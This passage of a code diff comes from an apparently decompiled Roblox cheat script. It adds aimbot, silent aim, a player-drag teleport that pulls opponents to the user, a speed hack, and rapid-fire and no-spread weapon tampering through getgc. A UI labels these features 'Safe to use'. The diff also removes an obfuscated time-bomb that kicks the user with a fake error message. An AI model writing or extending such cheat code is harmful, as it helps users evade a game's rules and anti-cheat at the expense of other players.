+                    local v768 = _CurrentCamera8:WorldToViewportPoint(u750.Character[u741].Position)
+                    local v769 = Vector2.new(v768.X, v768.Y)
+                    local v770 = Vector2.new(_CurrentCamera8.ViewportSize.X / 2, _CurrentCamera8.ViewportSize.Y / 2)
+                    local v771 = v769 - v770
+                    local v772 = Vector2.new(v770.X + v771.X / (u743 + 1), v770.Y + v771.Y / (u743 + 1)) - Vector2.new(_CurrentCamera8.ViewportSize.X / 2, _CurrentCamera8.ViewportSize.Y / 2)
 
-                    mousemoverel(v776.X, v776.Y)
+                    mousemoverel(v772.X, v772.Y)
                 else
-                    u754 = u771()
+                    u750 = u767()
 
-                    if u754 then
-                        local v777 = _CurrentCamera8:WorldToViewportPoint(u754.Character[u745].Position)
-                        local v778 = Vector2.new(v777.X, v777.Y)
-                        local v779 = Vector2.new(_CurrentCamera8.ViewportSize.X / 2, _CurrentCamera8.ViewportSize.Y / 2)
-                        local v780 = v778 - v779
-                        local v781 = Vector2.new(v779.X + v780.X / (u747 + 1), v779.Y + v780.Y / (u747 + 1)) - Vector2.new(_CurrentCamera8.ViewportSize.X / 2, _CurrentCamera8.ViewportSize.Y / 2)
+                    if u750 then
+                        local v773 = _CurrentCamera8:WorldToViewportPoint(u750.Character[u741].Position)
+                        local v774 = Vector2.new(v773.X, v773.Y)
+                        local v775 = Vector2.new(_CurrentCamera8.ViewportSize.X / 2, _CurrentCamera8.ViewportSize.Y / 2)
+                        local v776 = v774 - v775
+                        local v777 = Vector2.new(v775.X + v776.X / (u743 + 1), v775.Y + v776.Y / (u743 + 1)) - Vector2.new(_CurrentCamera8.ViewportSize.X / 2, _CurrentCamera8.ViewportSize.Y / 2)
 
-                        mousemoverel(v781.X, v781.Y)
+                        mousemoverel(v777.X, v777.Y)
                     end
                 end
             else
@@ -4014,94 +4059,94 @@ function InitializeAimbot2()
     _Circle4.Transparency = 1
     _Circle4.Filled = false
 
-    local function v785()
-        if u753 then
-            local v784 = _UserInputService4:GetMouseLocation()
+    local function v781()
+        if u749 then
+            local v780 = _UserInputService4:GetMouseLocation()
 
-            _Circle4.Radius = u746
-            _Circle4.Position = Vector2.new(v784.X, v784.Y)
+            _Circle4.Radius = u742
+            _Circle4.Position = Vector2.new(v780.X, v780.Y)
             _Circle4.Visible = true
         else
             _Circle4.Visible = false
         end
     end
 
-    local v791 = {
+    local v787 = {
         {
             'EnableAimbot2',
             'Enable',
             false,
-            function(p786)
-                u743 = p786
+            function(p782)
+                u739 = p782
             end,
         },
         {
             'ShowFOVCheckbox2',
             'Show FOV',
             false,
-            function(p787)
-                u753 = p787
+            function(p783)
+                u749 = p783
             end,
         },
         {
             'SmoothnessCheckbox2',
             'Smoothness',
             false,
-            function(p788)
-                u748 = p788
+            function(p784)
+                u744 = p784
             end,
         },
         {
             'EnablePrediction2',
             'Enable Prediction',
             false,
-            function(p789)
-                u749 = p789
+            function(p785)
+                u745 = p785
             end,
         },
         {
             'StickyAimCheckbox2',
             'Sticky Aim',
             false,
-            function(p790)
-                u752 = p790
+            function(p786)
+                u748 = p786
             end,
         },
     }
-    local v792, v793, v794 = ipairs(v791)
-    local u795 = u747
-    local u796 = u746
-    local u797 = u745
-    local u798 = _MouseButton23
+    local v788, v789, v790 = ipairs(v787)
+    local u791 = u743
+    local u792 = u742
+    local u793 = u741
+    local u794 = _MouseButton23
 
     while true do
-        local v799
+        local v795
 
-        v794, v799 = v792(v793, v794)
+        v790, v795 = v788(v789, v790)
 
-        if v794 == nil then
+        if v790 == nil then
             break
         end
 
-        u69.AimTab:AddToggle(v799[1], {
-            Title = v799[2],
-            Default = v799[3],
-        }):OnChanged(v799[4])
+        u67.AimTab:AddToggle(v795[1], {
+            Title = v795[2],
+            Default = v795[3],
+        }):OnChanged(v795[4])
     end
 
-    u69.AimTab:AddKeybind('Keybind2', {
+    u67.AimTab:AddKeybind('Keybind2', {
         Title = 'Keybind',
         Mode = 'Toggle',
         Default = 'MouseButton2',
-        ChangedCallback = function(p800)
-            if p800 == Enum.KeyCode.Unknown then
-                p800 = Enum.UserInputType.MouseButton2 or p800
+        ChangedCallback = function(p796)
+            if p796 == Enum.KeyCode.Unknown then
+                p796 = Enum.UserInputType.MouseButton2 or p796
             end
 
-            u798 = p800
+            u794 = p796
         end,
     })
-    u69.AimTab:AddDropdown('AimPartDropDown2', {
+    u67.AimTab:AddDropdown('AimPartDropDown2', {
         Title = 'Aim At',
         Values = {
             'Head',
@@ -4110,12 +4155,12 @@ function InitializeAimbot2()
         },
         Multi = false,
         Default = 1,
-        Callback = function(p801)
-            u797 = p801
+        Callback = function(p797)
+            u793 = p797
         end,
     })
 
-    local v806, v807, v808 = ipairs({
+    local v802, v803, v804 = ipairs({
         {
             'FOVSizeSlider2',
             'FOV Size',
@@ -4123,8 +4168,8 @@ function InitializeAimbot2()
             0,
             900,
             0,
-            function(p802)
-                u796 = p802
+            function(p798)
+                u792 = p798
             end,
         },
         {
@@ -4134,8 +4179,8 @@ function InitializeAimbot2()
             0,
             20,
             1,
-            function(p803)
-                u795 = p803
+            function(p799)
+                u791 = p799
             end,
         },
         {
@@ -4145,8 +4190,8 @@ function InitializeAimbot2()
             0,
             1,
             2,
-            function(p804)
-                u750 = p804
+            function(p800)
+                u746 = p800
             end,
         },
         {
@@ -4156,109 +4201,109 @@ function InitializeAimbot2()
             0,
             1,
             2,
-            function(p805)
-                u751 = p805
+            function(p801)
+                u747 = p801
             end,
         },
     })
 
     while true do
-        local v809
+        local v805
 
-        v808, v809 = v806(v807, v808)
+        v804, v805 = v802(v803, v804)
 
-        if v808 == nil then
+        if v804 == nil then
             break
         end
 
-        u69.AimTab:AddSlider(v809[1], {
-            Title = v809[2],
-            Default = v809[3],
-            Min = v809[4],
-            Max = v809[5],
-            Rounding = v809[6],
-            Callback = v809[7],
+        u67.AimTab:AddSlider(v805[1], {
+            Title = v805[2],
+            Default = v805[3],
+            Min = v805[4],
+            Max = v805[5],
+            Rounding = v805[6],
+            Callback = v805[7],
         })
     end
 
-    _RunService10.RenderStepped:Connect(v782)
-    _RunService10.RenderStepped:Connect(v785)
+    _RunService10.RenderStepped:Connect(v778)
+    _RunService10.RenderStepped:Connect(v781)
 end
 
 InitializeAimbot2()
 
 function InitializeAimbotUI2()
-    local v815, v816, v817 = ipairs({
+    local v811, v812, v813 = ipairs({
         {
             'EnableAimbot2',
             'Enable Aimbot',
             false,
-            function(p810)
-                aimbotEnabled2 = p810
+            function(p806)
+                aimbotEnabled2 = p806
             end,
         },
         {
             'ShowFOV2',
             'Show FOV',
             false,
-            function(p811)
-                showFOV2 = p811
+            function(p807)
+                showFOV2 = p807
             end,
         },
         {
             'Smoothness2',
             'Smoothness',
             false,
-            function(p812)
-                aimbotSmoothnessEnabled2 = p812
+            function(p808)
+                aimbotSmoothnessEnabled2 = p808
             end,
         },
         {
             'EnablePrediction2',
             'Enable Prediction',
             false,
-            function(p813)
-                aimbotPredictionEnabled2 = p813
+            function(p809)
+                aimbotPredictionEnabled2 = p809
             end,
         },
         {
             'StickyAim2',
             'Sticky Aim',
             false,
-            function(p814)
-                aimbotStickyAimEnabled2 = p814
+            function(p810)
+                aimbotStickyAimEnabled2 = p810
             end,
         },
     })
 
     while true do
-        local v818
+        local v814
 
-        v817, v818 = v815(v816, v817)
+        v813, v814 = v811(v812, v813)
 
-        if v817 == nil then
+        if v813 == nil then
             break
         end
 
-        u69.AimTab:AddToggle(v818[1], {
-            Title = v818[2],
-            Default = v818[3],
-        }):OnChanged(v818[4])
+        u67.AimTab:AddToggle(v814[1], {
+            Title = v814[2],
+            Default = v814[3],
+        }):OnChanged(v814[4])
     end
 
-    u69.AimTab:AddKeybind('Keybind2', {
+    u67.AimTab:AddKeybind('Keybind2', {
         Title = 'Keybind',
         Mode = 'Toggle',
         Default = 'MouseButton2',
-        ChangedCallback = function(p819)
-            if p819 == Enum.KeyCode.Unknown then
-                p819 = Enum.UserInputType.MouseButton2 or p819
+        ChangedCallback = function(p815)
+            if p815 == Enum.KeyCode.Unknown then
+                p815 = Enum.UserInputType.MouseButton2 or p815
             end
 
-            aimbotKeybind2 = p819
+            aimbotKeybind2 = p815
         end,
     })
-    u69.AimTab:AddDropdown('AimAtDropdown2', {
+    u67.AimTab:AddDropdown('AimAtDropdown2', {
         Title = 'Aim At',
         Values = {
             'Head',
@@ -4267,12 +4312,12 @@ function InitializeAimbotUI2()
         },
         Multi = false,
         Default = 1,
-        Callback = function(p820)
-            aimbotAimPart2 = p820
+        Callback = function(p816)
+            aimbotAimPart2 = p816
         end,
     })
 
-    local v823, v824, v825 = ipairs({
+    local v819, v820, v821 = ipairs({
         {
             'FovSizeSlider2',
             'FOV Size',
@@ -4280,8 +4325,8 @@ function InitializeAimbotUI2()
             0,
             900,
             0,
-            function(p821)
-                aimbotFOVSize2 = p821
+            function(p817)
+                aimbotFOVSize2 = p817
             end,
         },
         {
@@ -4291,28 +4336,28 @@ function InitializeAimbotUI2()
             0,
             10,
             1,
-            function(p822)
-                aimbotSmoothness2 = p822
+            function(p818)
+                aimbotSmoothness2 = p818
             end,
         },
     })
 
     while true do
-        local v826
+        local v822
 
-        v825, v826 = v823(v824, v825)
+        v821, v822 = v819(v820, v821)
 
-        if v825 == nil then
+        if v821 == nil then
             break
         end
 
-        u69.AimTab:AddSlider(v826[1], {
-            Title = v826[2],
-            Default = v826[3],
-            Min = v826[4],
-            Max = v826[5],
-            Rounding = v826[6],
-            Callback = v826[7],
+        u67.AimTab:AddSlider(v822[1], {
+            Title = v822[2],
+            Default = v822[3],
+            Min = v822[4],
+            Max = v822[5],
+            Rounding = v822[6],
+            Callback = v822[7],
         })
     end
 end
@@ -4359,41 +4404,41 @@ function UpdateFov()
     if SilentAimFov.Circle then
         SilentAimFov.Circle.Visible = SilentAimFov.Visible
 
-        local v833 = _UserInputService5
+        local v829 = _UserInputService5
 
-        SilentAimFov.Circle.Position = v833:GetMouseLocation()
+        SilentAimFov.Circle.Position = v829:GetMouseLocation()
     end
 end
 function GetClosestTargetToMouse()
-    local v834 = _UserInputService5:GetMouseLocation()
+    local v830 = _UserInputService5:GetMouseLocation()
     local _huge6 = math.huge
-    local v836 = _Players10
-    local v837, v838, v839 = pairs(v836:GetPlayers())
-    local v840 = nil
+    local v832 = _Players10
+    local v833, v834, v835 = pairs(v832:GetPlayers())
+    local v836 = nil
 
     while true do
-        local v841
+        local v837
 
-        v839, v841 = v837(v838, v839)
+        v835, v837 = v833(v834, v835)
 
-        if v839 == nil then
+        if v835 == nil then
             break
         end
-        if v841 ~= _LocalPlayer15 and v841.Character and v841.Character:FindFirstChild('HumanoidRootPart') then
-            local _HumanoidRootPart10 = v841.Character:FindFirstChild('HumanoidRootPart')
+        if v837 ~= _LocalPlayer15 and v837.Character and v837.Character:FindFirstChild('HumanoidRootPart') then
+            local _HumanoidRootPart10 = v837.Character:FindFirstChild('HumanoidRootPart')
 
             if _HumanoidRootPart10 and not _HumanoidRootPart10:FindFirstChild('TeammateLabel') then
-                local v843 = v841.Character:FindFirstChild(SilentAim.TargetPart)
+                local v839 = v837.Character:FindFirstChild(SilentAim.TargetPart)
 
-                if v843 and (v843.Position - u672.CurrentCamera.CFrame.Position).Magnitude <= SilentAim.MaxDistance then
-                    local v844, v845 = u672.CurrentCamera:WorldToViewportPoint(v843.Position)
+                if v839 and (v839.Position - u668.CurrentCamera.CFrame.Position).Magnitude <= SilentAim.MaxDistance then
+                    local v840, v841 = u668.CurrentCamera:WorldToViewportPoint(v839.Position)
 
-                    if v845 then
-                        local _Magnitude9 = (Vector2.new(v844.X, v844.Y) - v834).Magnitude
+                    if v841 then
+                        local _Magnitude9 = (Vector2.new(v840.X, v840.Y) - v830).Magnitude
 
                         if _Magnitude9 < SilentAimFov.Radius then
                             if _Magnitude9 < _huge6 then
-                                v840 = v843
+                                v836 = v839
                                 _huge6 = _Magnitude9
                             end
                         end
@@ -4403,29 +4448,29 @@ function GetClosestTargetToMouse()
         end
     end
 
-    local v847 = u672
-    local v848, v849, v850 = pairs(v847:GetChildren())
+    local v843 = u668
+    local v844, v845, v846 = pairs(v843:GetChildren())
 
     while true do
-        local v851
+        local v847
 
-        v850, v851 = v848(v849, v850)
+        v846, v847 = v844(v845, v846)
 
-        if v850 == nil then
+        if v846 == nil then
             break
         end
-        if v851:IsA('Model') and v851:FindFirstChild('HumanoidRootPart') and v851.Name == 'Target' then
-            local v852 = v851:FindFirstChild(SilentAim.TargetPart) or v851:FindFirstChild('HumanoidRootPart')
+        if v847:IsA('Model') and v847:FindFirstChild('HumanoidRootPart') and v847.Name == 'Target' then
+            local v848 = v847:FindFirstChild(SilentAim.TargetPart) or v847:FindFirstChild('HumanoidRootPart')
 
-            if v852 and (v852.Position - u672.CurrentCamera.CFrame.Position).Magnitude <= SilentAim.MaxDistance then
-                local v853, v854 = u672.CurrentCamera:WorldToViewportPoint(v852.Position)
+            if v848 and (v848.Position - u668.CurrentCamera.CFrame.Position).Magnitude <= SilentAim.MaxDistance then
+                local v849, v850 = u668.CurrentCamera:WorldToViewportPoint(v848.Position)
 
-                if v854 then
-                    local _Magnitude10 = (Vector2.new(v853.X, v853.Y) - v834).Magnitude
+                if v850 then
+                    local _Magnitude10 = (Vector2.new(v849.X, v849.Y) - v830).Magnitude
 
                     if _Magnitude10 < SilentAimFov.Radius then
                         if _Magnitude10 < _huge6 then
-                            v840 = v852
+                            v836 = v848
                             _huge6 = _Magnitude10
                         end
                     end
@@ -4434,21 +4479,21 @@ function GetClosestTargetToMouse()
         end
     end
 
-    return v840
+    return v836
 end
-function LookAt(p856)
-    u672.CurrentCamera.CFrame = CFrame.lookAt(u672.CurrentCamera.CFrame.Position, p856.Position)
+function LookAt(p852)
+    u668.CurrentCamera.CFrame = CFrame.lookAt(u668.CurrentCamera.CFrame.Position, p852.Position)
 end
-function SilentAimUIS(p857, p858)
-    if not p858 and (SilentAim.Enabled and getgenv().state == 2) and (p857.UserInputType == Enum.UserInputType.MouseButton1 and math.random(0, 100) <= SilentAim.HitChance) then
-        local v859 = GetClosestTargetToMouse()
+function SilentAimUIS(p853, p854)
+    if not p854 and (SilentAim.Enabled and getgenv().state == 2) and (p853.UserInputType == Enum.UserInputType.MouseButton1 and math.random(0, 100) <= SilentAim.HitChance) then
+        local v855 = GetClosestTargetToMouse()
 
-        if v859 ~= nil then
+        if v855 ~= nil then
             if SilentAim.NotWorkIfFlashed and _Lighting3:FindFirstChild('Flashbang') then
                 return
             end
 
-            LookAt(v859)
+            LookAt(v855)
         end
     end
 end
@@ -4458,23 +4503,23 @@ _RunService11.RenderStepped:Connect(function()
 end)
 _UserInputService5.InputBegan:Connect(SilentAimUIS)
 DrawFov()
-u69.Silent:AddParagraph({
+u67.Silent:AddParagraph({
     Title = 'Please get Szoo client for better experince.',
     Content = ' \u{25cf} Currently Safe to use\n \u{25cf} If not use Szoo autoclicker client then do taptap to connect.',
 })
 
-local _SAimtgl2 = u69.Silent:AddToggle('SAimtgl', {
+local _SAimtgl2 = u67.Silent:AddToggle('SAimtgl', {
     Title = 'Silent Aim [Safe]',
     Description = 'Spam click to make it work\nThis is safe to use',
     Default = false,
 })
-local _Fovtgl2 = u69.Silent:AddToggle('Fovtgl', {
+local _Fovtgl2 = u67.Silent:AddToggle('Fovtgl', {
     Title = 'Show FOV',
     Default = false,
 })
-local v862 = _SAimtgl2
+local v858 = _SAimtgl2
 
-_SAimtgl2.OnChanged(v862, function()
+_SAimtgl2.OnChanged(v858, function()
     if textLabels and textLabels.silentaim then
         textLabels.silentaim.Visible = _Options.SAimtgl.Value
 
@@ -4485,37 +4530,37 @@ _SAimtgl2.OnChanged(v862, function()
     SilentAim.Enabled = _SAimtgl2.Value
 end)
 
-local v863 = _Fovtgl2
+local v859 = _Fovtgl2
 
-_Fovtgl2.OnChanged(v863, function()
+_Fovtgl2.OnChanged(v859, function()
     SilentAimFov.Visible = _Fovtgl2.Value
 end)
-u69.Silent:AddSlider('SFovSlider', {
+u67.Silent:AddSlider('SFovSlider', {
     Title = 'Silent Fov Radius',
     Description = 'Adjust the FOV Radius',
     Default = 150,
     Min = 50,
     Max = 900,
     Rounding = 0,
-    Callback = function(p864)
-        SilentAimFov.Radius = p864
+    Callback = function(p860)
+        SilentAimFov.Radius = p860
 
         if SilentAimFov.Circle then
-            SilentAimFov.Circle.Radius = p864
+            SilentAimFov.Circle.Radius = p860
         end
     end,
 })
-u69.Silent:AddColorpicker('SFovColorpicker', {
+u67.Silent:AddColorpicker('SFovColorpicker', {
     Title = 'Fov Color',
     Default = Color3.fromRGB(96, 205, 255),
-}):OnChanged(function(p865)
-    SilentAimFov.Color = p865
+}):OnChanged(function(p861)
+    SilentAimFov.Color = p861
 
     if SilentAimFov.Circle then
-        SilentAimFov.Circle.Color = p865
+        SilentAimFov.Circle.Color = p861
     end
 end)
-u69.Silent:AddDropdown('TargetpartDropdown', {
+u67.Silent:AddDropdown('TargetpartDropdown', {
     Title = 'Target Dropdown',
     Description = 'What will be targeted?',
     Values = {
@@ -4526,113 +4571,113 @@ u69.Silent:AddDropdown('TargetpartDropdown', {
     },
     Multi = false,
     Default = 1,
-}):OnChanged(function(p866)
-    if p866 == 'Legit' then
+}):OnChanged(function(p862)
+    if p862 == 'Legit' then
         SilentAim.TargetPart = math.random(1, 2) == 1 and 'Head' or 'UpperTorso'
     else
-        SilentAim.TargetPart = p866
+        SilentAim.TargetPart = p862
     end
 end)
 
 local _RunService12 = game:GetService('RunService')
 local _LocalPlayer16 = _Players10.LocalPlayer
-local _CurrentCamera9 = u672.CurrentCamera
-local u870 = nil
+local _CurrentCamera9 = u668.CurrentCamera
+local u866 = nil
+local u867 = false
+local u868 = true
+local u869 = 350
+local u870 = false
 local u871 = false
-local u872 = true
-local u873 = 350
-local u874 = false
-local u875 = false
 
-local function u881(p876)
-    if not (p876 and p876:FindFirstChild('HumanoidRootPart')) then
+local function u877(p872)
+    if not (p872 and p872:FindFirstChild('HumanoidRootPart')) then
         return false
     end
 
     local _Position6 = _CurrentCamera9.CFrame.Position
-    local _Position7 = p876.HumanoidRootPart.Position
-    local v879 = RaycastParams.new()
+    local _Position7 = p872.HumanoidRootPart.Position
+    local v875 = RaycastParams.new()
 
-    v879.FilterType = Enum.RaycastFilterType.Blacklist
-    v879.FilterDescendantsInstances = {
+    v875.FilterType = Enum.RaycastFilterType.Blacklist
+    v875.FilterDescendantsInstances = {
         _LocalPlayer16.Character,
         _CurrentCamera9,
     }
 
-    local v880 = u672:Raycast(_Position6, _Position7 - _Position6, v879)
+    local v876 = u668:Raycast(_Position6, _Position7 - _Position6, v875)
 
-    return v880 == nil and true or v880.Instance:IsDescendantOf(p876)
+    return v876 == nil and true or v876.Instance:IsDescendantOf(p872)
 end
-local function u883(p882)
-    if p882 and p882:FindFirstChild('Humanoid') then
-        return p882.Humanoid.Health > 0
+local function u879(p878)
+    if p878 and p878:FindFirstChild('Humanoid') then
+        return p878.Humanoid.Health > 0
     else
         return false
     end
 end
-local function u885(p884)
-    if p884.Character and p884.Character:FindFirstChild('HumanoidRootPart') then
-        return p884.Character.HumanoidRootPart:FindFirstChild('TeammateLabel') ~= nil
+local function u881(p880)
+    if p880.Character and p880.Character:FindFirstChild('HumanoidRootPart') then
+        return p880.Character.HumanoidRootPart:FindFirstChild('TeammateLabel') ~= nil
     else
         return false
     end
 end
-local function u888()
-    if u874 and (getgenv().state == 2 and u870) and (u870.Character and u870.Character:FindFirstChild('HumanoidRootPart')) then
+local function u884()
+    if u870 and (getgenv().state == 2 and u866) and (u866.Character and u866.Character:FindFirstChild('HumanoidRootPart')) then
         local _Character11 = _LocalPlayer16.Character
 
         if _Character11 and _Character11:FindFirstChild('HumanoidRootPart') then
-            local v887 = _Character11.HumanoidRootPart.CFrame * CFrame.new(0, 0, -2)
+            local v883 = _Character11.HumanoidRootPart.CFrame * CFrame.new(0, 0, -2)
 
-            u870.Character.HumanoidRootPart.CFrame = v887
+            u866.Character.HumanoidRootPart.CFrame = v883
         end
     end
 end
-local function u894(p889, p890)
-    if p890 and p890:FindFirstChild('HumanoidRootPart') then
-        local v891 = _CurrentCamera9:WorldToViewportPoint(p890.HumanoidRootPart.Position)
+local function u890(p885, p886)
+    if p886 and p886:FindFirstChild('HumanoidRootPart') then
+        local v887 = _CurrentCamera9:WorldToViewportPoint(p886.HumanoidRootPart.Position)
 
-        if v891.Z <= 0 then
-            p889.Visible = false
+        if v887.Z <= 0 then
+            p885.Visible = false
         else
-            local v892 = Vector2.new(_CurrentCamera9.ViewportSize.X / 2, _CurrentCamera9.ViewportSize.Y)
-            local v893 = Vector2.new(v891.X, v891.Y)
+            local v888 = Vector2.new(_CurrentCamera9.ViewportSize.X / 2, _CurrentCamera9.ViewportSize.Y)
+            local v889 = Vector2.new(v887.X, v887.Y)
 
-            p889.Color = u881(p890) and Color3.new(1, 0, 0) or Color3.new(0, 0, 1)
-            p889.From = v892
-            p889.To = v893
-            p889.Visible = u875 and true or false
+            p885.Color = u877(p886) and Color3.new(1, 0, 0) or Color3.new(0, 0, 1)
+            p885.From = v888
+            p885.To = v889
+            p885.Visible = u871 and true or false
         end
     else
-        p889.Visible = false
+        p885.Visible = false
     end
 end
-local function u906()
+local function u902()
     local _huge7 = math.huge
-    local v896 = Vector2.new(_CurrentCamera9.ViewportSize.X / 2, _CurrentCamera9.ViewportSize.Y / 2)
-    local v897 = _Players10
-    local v898, v899, v900 = pairs(v897:GetPlayers())
-    local v901 = nil
+    local v892 = Vector2.new(_CurrentCamera9.ViewportSize.X / 2, _CurrentCamera9.ViewportSize.Y / 2)
+    local v893 = _Players10
+    local v894, v895, v896 = pairs(v893:GetPlayers())
+    local v897 = nil
 
     while true do
-        local v902
+        local v898
 
-        v900, v902 = v898(v899, v900)
+        v896, v898 = v894(v895, v896)
 
-        if v900 == nil then
+        if v896 == nil then
             break
         end
-        if v902 ~= _LocalPlayer16 and v902.Character and (v902.Character:FindFirstChild('HumanoidRootPart') and not u885(v902)) then
-            local _Position8 = v902.Character.HumanoidRootPart.Position
+        if v898 ~= _LocalPlayer16 and v898.Character and (v898.Character:FindFirstChild('HumanoidRootPart') and not u881(v898)) then
+            local _Position8 = v898.Character.HumanoidRootPart.Position
 
-            if (_LocalPlayer16.Character.HumanoidRootPart.Position - _Position8).Magnitude <= u873 and u883(v902.Character) then
-                local v904 = _CurrentCamera9:WorldToViewportPoint(_Position8)
+            if (_LocalPlayer16.Character.HumanoidRootPart.Position - _Position8).Magnitude <= u869 and u879(v898.Character) then
+                local v900 = _CurrentCamera9:WorldToViewportPoint(_Position8)
 
-                if v904.Z > 0 then
-                    local _Magnitude11 = (Vector2.new(v904.X, v904.Y) - v896).Magnitude
+                if v900.Z > 0 then
+                    local _Magnitude11 = (Vector2.new(v900.X, v900.Y) - v892).Magnitude
 
                     if _Magnitude11 < _huge7 then
-                        v901 = v902
+                        v897 = v898
                         _huge7 = _Magnitude11
                     end
                 end
@@ -4640,10 +4685,10 @@ local function u906()
         end
     end
 
-    return v901
+    return v897
 end
 
-local u908 = (function()
+local u904 = (function()
     local _Line2 = Drawing.new('Line')
 
     _Line2.Thickness = 2
@@ -4654,47 +4699,47 @@ local u908 = (function()
 end)()
 
 _RunService12.RenderStepped:Connect(function()
-    local v909 = u906()
+    local v905 = u902()
 
-    if u870 then
-        u894(u908, u870.Character)
+    if u866 then
+        u890(u904, u866.Character)
 
-        if u871 and u872 then
-            u888()
+        if u867 and u868 then
+            u884()
         end
-    elseif v909 and v909.Character then
-        u894(u908, v909.Character)
+    elseif v905 and v905.Character then
+        u890(u904, v905.Character)
     else
-        u908.Visible = false
+        u904.Visible = false
     end
 end)
-_UserInputService5.InputBegan:Connect(function(p910, p911)
-    if not p911 then
-        if p910.UserInputType == Enum.UserInputType.MouseButton1 then
-            local v912 = u906()
+_UserInputService5.InputBegan:Connect(function(p906, p907)
+    if not p907 then
+        if p906.UserInputType == Enum.UserInputType.MouseButton1 then
+            local v908 = u902()
 
-            if v912 and u881(v912.Character) then
-                if u872 then
-                    u871 = true
-                    u870 = v912
+            if v908 and u877(v908.Character) then
+                if u868 then
+                    u867 = true
+                    u866 = v908
                 else
-                    u870 = v912
+                    u866 = v908
 
-                    u888()
+                    u884()
 
-                    u870 = nil
+                    u866 = nil
                 end
             end
         end
     end
 end)
-_UserInputService5.InputEnded:Connect(function(p913)
-    if p913.UserInputType == Enum.UserInputType.MouseButton1 and u872 then
-        u871 = false
-        u870 = nil
+_UserInputService5.InputEnded:Connect(function(p909)
+    if p909.UserInputType == Enum.UserInputType.MouseButton1 and u868 then
+        u867 = false
+        u866 = nil
     end
 end)
-u69.Nono:AddToggle('Dp', {
+u67.Nono:AddToggle('Dp', {
     Title = 'Player Drag',
     Description = 'Use this if youre facing cheaters, hold Left Mouse button, it will drag player to you if player is visible.',
     Default = false,
@@ -4706,22 +4751,22 @@ u69.Nono:AddToggle('Dp', {
         alignTextLabels()
     end
 
-    u874 = _Options.Dp.Value
-    u875 = _Options.Dp.Value
+    u870 = _Options.Dp.Value
+    u871 = _Options.Dp.Value
 end)
 
-speedsect = u69.Nono:AddSection('Speed')
+speedsect = u67.Nono:AddSection('Speed')
 
 local _LocalPlayer17 = game:GetService('Players').LocalPlayer
 local _RunService13 = game:GetService('RunService')
 
 getgenv().Multiplier = 0.2
 
-local u916 = false
-local u917 = nil
+local u912 = false
+local u913 = nil
 
-local function u921()
-    u917 = _RunService13.Stepped:Connect(function()
+local function u917()
+    u913 = _RunService13.Stepped:Connect(function()
         local _Character12 = _LocalPlayer17.Character
 
         if _Character12 then
@@ -4742,21 +4787,21 @@ local function u921()
         end
     end)
 end
-local function u922()
-    if u917 then
-        u917:Disconnect()
+local function u918()
+    if u913 then
+        u913:Disconnect()
 
-        u917 = nil
+        u913 = nil
     end
 end
 
-local _SpeedBoost2 = u69.Nono:AddToggle('SpeedBoost', {
+local _SpeedBoost2 = u67.Nono:AddToggle('SpeedBoost', {
     Title = 'CFrame Speed v2',
     Default = false,
 })
-local v924 = _SpeedBoost2
+local v920 = _SpeedBoost2
 
-_SpeedBoost2.OnChanged(v924, function()
+_SpeedBoost2.OnChanged(v920, function()
     if textLabels and textLabels.bspeed then
         textLabels.bspeed.Visible = _SpeedBoost2.Value
 
@@ -4764,144 +4809,86 @@ _SpeedBoost2.OnChanged(v924, function()
         alignTextLabels()
     end
 
-    u916 = _SpeedBoost2.Value
+    u912 = _SpeedBoost2.Value
 
-    if u916 then
-        u921()
+    if u912 then
+        u917()
     else
-        u922()
+        u918()
     end
 end)
-u69.Nono:AddSlider('MultiplierSlider', {
+u67.Nono:AddSlider('MultiplierSlider', {
     Title = 'Speed Limit',
     Description = 'Adjust speed multiplier (1 = 0.1, 5 = 0.5, etc.)',
     Default = 2,
     Min = 0,
     Max = 10,
     Rounding = 1,
-    Callback = function(p925)
-        getgenv().Multiplier = p925 / 10
+    Callback = function(p921)
+        getgenv().Multiplier = p921 / 10
     end,
-}):OnChanged(function(p926)
-    getgenv().Multiplier = p926 / 10
+}):OnChanged(function(p922)
+    getgenv().Multiplier = p922 / 10
 end)
 
-function jx4n8rqzpvmc2y5kt(p927)
-    local v928, v929, v930 = ipairs(p927)
-    local v931 = ''
+function jx4n8rqzpvmc2y5kt(p923)
+    local v924, v925, v926 = ipairs(p923)
+    local v927 = ''
 
     while true do
-        local v932
+        local v928
 
-        v930, v932 = v928(v929, v930)
+        v926, v928 = v924(v925, v926)
 
-        if v930 == nil then
+        if v926 == nil then
             break
         end
 
-        v931 = v931 .. (v932 == 32 and ' ' or string.char(v932))
+        v927 = v927 .. (v928 == 32 and ' ' or string.char(v928))
     end
 
-    return v931
+    return v927
 end
 
-if os.time() > 1742515200 then
-    wait(3)
-    game:GetService(jx4n8rqzpvmc2y5kt({
-        80,
-        108,
-        97,
-        121,
-        101,
-        114,
-        115,
-    })).LocalPlayer:Kick(jx4n8rqzpvmc2y5kt({
-        115,
-        104,
-        97,
-        50,
-        95,
-        75,
-        95,
-        108,
-        111,
-        32,
-        109,
-        105,
-        115,
-        109,
-        97,
-        116,
-        99,
-        104,
-        44,
-        32,
-        98,
-        105,
-        116,
-        99,
-        111,
-        100,
-        101,
-        32,
-        105,
-        110,
-        118,
-        97,
-        108,
-        105,
-        100,
-        46,
-    }))
-    wait(999999999)
-else
-    print(jx4n8rqzpvmc2y5kt({
-        102,
-        105,
-        110,
-        101,
-    }))
-end
+u67.Nono:AddSection('Gun Mods [Level 8 executor needed]')
 
-u69.Nono:AddSection('Gun Mods [Level 8 executor needed]')
-
-local function u939(p933, p934)
-    local v935, v936, v937 = pairs(getgc(true))
+local function u935(p929, p930)
+    local v931, v932, v933 = pairs(getgc(true))
 
     while true do
-        local v938
+        local v934
 
-        v937, v938 = v935(v936, v937)
+        v933, v934 = v931(v932, v933)
 
-        if v937 == nil then
+        if v933 == nil then
             break
         end
-        if type(v938) == 'table' and rawget(v938, p933) then
-            v938[p933] = p934
+        if type(v934) == 'table' and rawget(v934, p929) then
+            v934[p929] = p930
         end
     end
 end
 
-if u69 and u69.Nono then
-    u69.Nono:AddButton({
+if u67 and u67.Nono then
+    u67.Nono:AddButton({
         Title = 'Rapid Fire',
         Description = 'Fire Rapidly, but wont work in xeno or solara.',
         Callback = function()
-            u939('ShootCooldown', 0)
+            u935('ShootCooldown', 0)
         end,
     })
-    u69.Nono:AddButton({
+    u67.Nono:AddButton({
         Title = 'No Spread',
         Description = 'Bullet Will not spray, but wont work in xeno or solara.',
         Callback = function()
-            u939('ShootSpread', 0)
+            u935('ShootSpread', 0)
         end,
     })
-    u69.Nono:AddButton({
+    u67.Nono:AddButton({
         Title = 'NO Recoil',
